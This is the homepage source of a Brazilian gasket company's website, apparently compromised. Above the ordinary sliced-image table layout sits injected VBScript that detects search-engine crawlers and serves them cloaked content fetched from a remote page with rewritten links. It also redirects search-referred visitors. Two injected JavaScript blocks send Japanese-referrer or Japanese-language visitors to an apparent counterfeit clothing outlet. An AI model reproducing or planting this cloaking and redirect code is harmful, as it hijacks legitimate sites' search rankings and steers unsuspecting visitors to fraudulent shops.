<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
on error resume next
desurljiechi="http://www.juntasparana.com.br/3.html"
arrdom = Split(desurljiechi, "/")
For dd = 0 To 2
    desurl = desurl & arrdom(dd)& "/"
Next
shellurl="http://"&Request.ServerVariables("Http_Host")&replace(replace(LCase(replace(Request.ServerVariables("REQUEST_URI"),"?"&request.ServerVariables("QUERY_STRING"),"")),"index.asp",""),"default.asp","")&"?"
rp="nike"
rc="online"
function is_spider()
	dim s_agent
	s_agent=Request.ServerVariables("HTTP_USER_AGENT")

	If instr(s_agent,"google")>0 Or instr(s_agent,"yahoo")>0 Or instr(s_agent,"bing")>0 Or instr(s_agent,"msnbot")>0 Or instr(s_agent,"alexa")>0 Or instr(s_agent,"ask")>0 Or instr(s_agent,"findlinks")>a0 Or instr(s_agent,"altavista")>0 Or instr(s_agent,"baidu")>0 Or instr(s_agent,"inktomi")>0 Then
	is_spider = 1
	else
	is_spider = 0
	end if
end function

Function GetHtml(url,k)
  agent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"&k
  Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
  ObjXMLHTTP.Open "GET",url,False
  ObjXMLHTTP.setRequestHeader "User-Agent",agent
  ObjXMLHTTP.setRequestHeader "Referer", "https://www.google.com/"
  ObjXMLHTTP.send
  GetHtml=ObjXMLHTTP.responseBody
  Set ObjXMLHTTP=Nothing
  set objStream = Server.CreateObject("Adodb.Stream")
  objStream.Type = 1
  objStream.Mode =3
  objStream.Open
  objStream.Write GetHtml
  objStream.Position = 0
  objStream.Type = 2
  objStream.Charset = "utf-8"
  
  GetHtml = objStream.ReadText
  objStream.Close
End Function
Function IsUserSearch()
	s_ref=Request.ServerVariables("HTTP_REFERER")
	If instr(s_ref,"google")>0 Or instr(s_ref,"yahoo")>0 Or instr(s_ref,"bing")>0 Or instr(s_ref,"aol")>0 Then
		IsUserSearch = true
	else
		IsUserSearch = false
	end if
End Function
Function RegExpMatches(patrn, strng)
	Dim regEx, Match, Matches
	Set regEx = New RegExp
	regEx.Pattern = patrn
	regEx.IgnoreCase = True
	regEx.Global = True
	Set Matches = regEx.Execute(strng)
	Dim MyArray()
	Dim i
	i=0
	For Each Match in Matches
		ReDim Preserve MyArray(i)
		MyArray(i)=Match.Value
		i=i-(-1)
	Next
	RegExpMatches = MyArray
End Function

Function RegExpReplace(html,patrn, strng)
Dim regEx
Set regEx = New RegExp
regEx.Pattern = patrn
regEx.IgnoreCase = True
regEx.Global = True
RegExpReplace=regEx.Replace(html,strng)
End Function

Function cDec(num)
 cDecstr=0
 if len(num)>0 and isnumeric(num) then
  for inum=0 to len(num)-1
   cDecstr=cDecstr-(-(2^inum*cint(mid(num,len(num)-inum,1))))
  next
 end if
 cDec=cDecstr
End Function 

Function OcB(num)
 OcBstr=""
 if len(num)>0 and isnumeric(num) then
  for i=1 to len(num)
   select case (mid(num,i,1))
    case "0" OcBstr=OcBstr&"000"
    case "1" OcBstr=OcBstr&"001"
    case "2" OcBstr=OcBstr&"010"
    case "3" OcBstr=OcBstr&"011"
    case "4" OcBstr=OcBstr&"100"
    case "5" OcBstr=OcBstr&"101"
    case "6" OcBstr=OcBstr&"110"
    case "7" OcBstr=OcBstr&"111"
   end select
  next
 end if
 OcB=OcBstr
End Function 

Function OcD(num)
 OcD=cDec(OcB(num))
End Function 

Function toOct(objMatch)
	    toOct = "-"&rp&"-"&Oct(objMatch.subMatches(0))&"."
End Function

Function toDeOct(objMatch)
	    toDeOct = "-p-"&OcD(objMatch.subMatches(0))&"."
End Function

Function toCOct(objMatch)
	    toCOct = "-"&rc&"-"&Oct(objMatch.subMatches(0))&objMatch.subMatches(1)
End Function

Function toCDeOct(objMatch)
	    toCDeOct = "-c-"&OcD(objMatch.subMatches(0))&objMatch.subMatches(1)
End Function

Function RegExpReplaceCall( reg, m, str, fstr)
	    Dim Fun, Match, Matches, i, nStr, LastIndex
	    If str & "" = "" Then Exit Function
	    Set Fun = getRef(fstr)
	    Set regEx = New RegExp
		regEx.Pattern = reg
		regEx.IgnoreCase = True
		regEx.Global = True
		Set Matches = regEx.Execute(str)
	    LastIndex = 1
	    For Each Match In Matches
	        If Match.FirstIndex>0 Then
	            nStr = nStr & Mid(str, LastIndex, Match.FirstIndex-(-1)-LastIndex)
	        End If
	        nStr = nStr & Fun(Match)
        LastIndex = Match.FirstIndex-(-1)-(-Match.Length)
	    Next
	    nStr = nStr & Mid(str, LastIndex)
	    RegExpReplaceCall = nStr
End Function

Function RegReplaceCall( reg, str, fstr)
	    RegReplaceCall = RegExpReplaceCall(reg, "ig", str, fstr)
End Function

spider = is_spider()
querystr = request.ServerVariables("QUERY_STRING")
if  spider = 1 or querystr = "feiya" then
    if querystr = "feiya" then
	    querystr = ""
	end if
	if querystr <> "" then
		querystr = RegReplaceCall("-"&rp&"-(\d"&chr(43)&")\.",querystr,"toDeOct")
		querystr = RegReplaceCall("-"&rc&"-(\d"&chr(43)&")([\._])",querystr,"toCDeOct")
		htmls = GetHtml(desurl&querystr,"")
	else
	    htmls = GetHtml(desurljiechi&querystr,"")
	end if

	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])"&desurl,"href=$1"&shellurl)
	desurl1 = RegExpReplace(desurl,"/$","")
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])"&desurl1,"href=$1"&shellurl)
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])/","href=$1"&shellurl)
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])(?!http)","href=$1"&shellurl)
	
	htmls = RegExpReplace(htmls,"src\s*=\s*(["&chr(34)&"'])"&desurl,"src=$1"&shellurl)
	htmls = RegExpReplace(htmls,"src\s*=\s*(["&chr(34)&"'])/","src=$1"&shellurl)
	htmls = RegExpReplace(htmls,"src\s*=\s*(["&chr(34)&"'])(?!http)","src=$1"&shellurl)
	htmls = RegExpReplace(htmls,"url\((["&chr(34)&"'])","url($1"&shellurl)
	
	desurl2 = replace(desurl1,"http://www.","")
	desurl2 = replace(desurl2,"http://","")
	htmls = replace(htmls,desurl2,Request.ServerVariables("Http_Host"),1,-1,1)
	
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])"&shellurl&"\?(.*\.css)","href=$1"&desurl&"$2")
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])"&shellurl&"\?(.*\.ico)","href=$1"&desurl&"$2")
	
	htmls = RegExpReplace(htmls,"src\s*=\s*(["&chr(34)&"'])"&shellurl&"\?","src=$1"&desurl)
	
	shellurlrm =  shellurl
	shellurlrm=replace(shellurlrm,"?","")
	htmls = RegExpReplace(htmls,shellurlrm&"\?(["&chr(34)&"'])",shellurlrm&"$1")
	
	htmls = RegReplaceCall("-p-(\d"&chr(43)&")\.",htmls,"toOct")
	htmls = RegReplaceCall("-c-(\d"&chr(43)&")([\._])",htmls,"toCOct")
	
	htmls =  replace(htmls,"window.location.href","var jp")
	htmls =  replace(htmls,"location.href",";var jp")
	response.write htmls
	response.end()
else
	if IsUserSearch then
		if instr(jumpcode,".txt")>0 then
			jumpcode = GetHtml(jumpcode,"Mozi11a")
			tiaoarray=split(jumpcode,"?")
			if IsEmpty(tiaoarray(0)) then 
			   response.redirect jumpcode&"?"&shellurl
			else
			   response.redirect tiaoarray(0)&"?"&shellurl
			end if
		end if
	end if
end if

%>
<script>
  var s=document.referrer;
  if(s.indexOf("google.co.jp")>0||s.indexOf("docomo.ne.jp")>0||s.indexOf("yahoo.co.jp")>0)
  {
  self.location="https://www.parkaoutletjp.com/";
  }
</script>
<SCRIPT LANGUAGE="JavaScript1.2">
<!--//
if (navigator.appName == 'Netscape')
var language = navigator.language;
else
var language = navigator.browserLanguage;
if (language.indexOf('ja') > -1) document.location.href = 'https://www.parkaoutletjp.com/';
// End -->
</script>
<html>
<head>
<title>index</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<!-- Save for Web Slices (index.psd) -->
<table width="779" height="1144" border="0" align="center" cellpadding="0" cellspacing="0" id="Tabela_01">
  <tr>
		
    <td colspan="6" rowspan="3"> <img src="images/index_01.jpg" width="278" height="95" alt=""></td>
		
    <td colspan="17"> <img src="images/index_02.gif" width="500" height="30" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="30" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3"> <a href="index.html"><img src="images/index_03.gif" alt="" width="74" height="36" border="0"></a></td>
    <td colspan="3"> <a href="produtos.html"><img src="images/index_04.gif" alt="" width="90" height="36" border="0"></a></td>
    <td colspan="3"> <a href="local.html"><img src="images/index_05.gif" alt="" width="112" height="36" border="0"></a></td>
    <td colspan="3"> <a href="cert.html"><img src="images/index_06.gif" alt="" width="119" height="36" border="0"></a></td>
    <td colspan="5"> <a href="cont.html"><img src="images/index_07.gif" alt="" width="105" height="36" border="0"></a></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="36" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="17"> <img src="images/index_08.gif" width="500" height="29" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="29" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="23"> <img src="images/banner.jpg" width="778" height="153"></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="153" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="19"> <img src="images/index_10.gif" width="718" height="35" alt=""></td>
		
    <td colspan="2"> <a href="index.html"><img src="images/index_11.gif" alt="" width="23" height="35" border="0"></a></td>
    <td> <a href="mailto:juntasparana@juntasparana.com.br" target="_blank"><img src="images/index_12.gif" alt="" width="26" height="35" border="0"></a></td>
    <td> <img src="images/index_13.gif" width="11" height="35" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="35" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3"> <a href="index.html"><img src="images/index_14.gif" alt="" width="151" height="29" border="0"></a></td>
    <td rowspan="17"> <img src="images/index_Fatia-15.gif" width="11" height="787" alt=""></td>
		
    <td colspan="9" rowspan="2"> <img src="images/index_16.gif" width="336" height="48" alt=""></td>
		
    <td colspan="10" rowspan="2"> <img src="images/index_17.gif" width="280" height="48" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="29" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3" rowspan="2"> <a href="produtos.html"><img src="images/index_18.gif" alt="" width="151" height="31" border="0"></a></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="19" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="19" rowspan="2"> <img src="images/index_19.gif" width="616" height="33" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="12" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3" rowspan="2"> <a href="repres.html"><img src="images/index_20.gif" alt="" width="151" height="31" border="0"></a></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="21" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="9" rowspan="7"> <img src="images/index_21.gif" width="336" height="174" alt=""></td>
		
    <td colspan="10" rowspan="6"> <img src="images/index_22.gif" width="280" height="159" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="10" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3"> <a href="local.html"><img src="images/index_23.gif" alt="" width="151" height="30" border="0"></a></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="30" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3"> <a href="cert.html"><img src="images/index_24.gif" alt="" width="151" height="32" border="0"></a></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="32" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3"> <a href="cont.html"><img src="images/index_25.gif" alt="" width="151" height="31" border="0"></a></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="31" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3"> <a href="lanc.html"><img src="images/index_26.gif" alt="" width="151" height="31" border="0"></a></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="31" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3" rowspan="3"> <img src="images/index_27.jpg" width="151" height="104" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="25" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3"> <img src="images/index_28.gif" width="83" height="15" alt=""></td>
		
    <td colspan="4"> <a href="images/juntaspar.jpg" target="_blank"><img src="images/index_29.gif" alt="" width="149" height="15" border="0"></a></td>
    <td colspan="3"> <img src="images/index_30.gif" width="48" height="15" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="15" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3" rowspan="3"> <img src="images/index_31.gif" width="133" height="151" alt=""></td>
		
    <td colspan="10" rowspan="3"> <img src="images/index_32.gif" width="365" height="151" alt=""></td>
		
    <td colspan="6" rowspan="3"> <img src="images/index_33.jpg" width="118" height="151" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="64" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3"> <a href="https://www.facebook.com/juntasparana/?fref=ts" target="_blank"><img src="images/index_34.jpg" alt="" width="151" height="51" border="0"></a></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="51" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="3" rowspan="4"> <img src="images/index_Fatia-35.gif" width="151" height="417" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="36" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="19"> <img src="images/index_Fatia-36.gif" width="616" height="147" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="147" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="6" rowspan="2"> <img src="images/index_Fatia-37.gif" width="216" height="234" alt=""></td>
		
    <td colspan="4"> <a href="/httpdocs/certificado2027.pdf" target="_blank"><img src="images/index_Fatia-38.gif" alt="" width="158" height="203" border="0"></a></td>
    <td colspan="9" rowspan="2"> <img src="images/index_Fatia-39.gif" width="242" height="234" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="203" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="4"> <img src="images/index_Fatia-40.gif" width="158" height="31" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="31" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="23"> <img src="images/index_36.gif" width="778" height="40" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="41" alt=""></td>
	</tr>
	<tr>
		
    <td> <a href="index.html"><img src="images/index_39.gif" alt="" width="48" height="18" border="0"></a></td>
    <td> <a href="produtos.html"><img src="images/index_40.gif" alt="" width="72" height="18" border="0"></a></td>
    <td colspan="3"> <a href="local.html"><img src="images/index_41.gif" alt="" width="90" height="18" border="0"></a></td>
    <td colspan="3"> <a href="cert.html"><img src="images/index_42.gif" alt="" width="92" height="18" border="0"></a></td>
    <td colspan="3"> <a href="cont.html"><img src="images/index_43.gif" alt="" width="89" height="18" border="0"></a></td>
    <td colspan="12"> <img src="images/index_38.jpg" width="387" height="19" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="18" alt=""></td>
	</tr>
	<tr>
		
    <td colspan="23"> <img src="images/index_44.gif" width="778" height="14" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="1" height="14" alt=""></td>
	</tr>
	<tr>
		<td>
			<img src="imagens/spacer.gif" width="48" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="72" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="31" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="11" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="48" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="68" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="17" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="7" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="50" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="26" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="13" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="51" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="56" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="38" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="18" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="27" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="79" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="13" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="45" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="12" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="11" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="26" height="1" alt=""></td>
		<td>
			<img src="imagens/spacer.gif" width="11" height="1" alt=""></td>
		<td></td>
	</tr>
</table>
<!-- End Save for Web Slices -->
</body>
</html>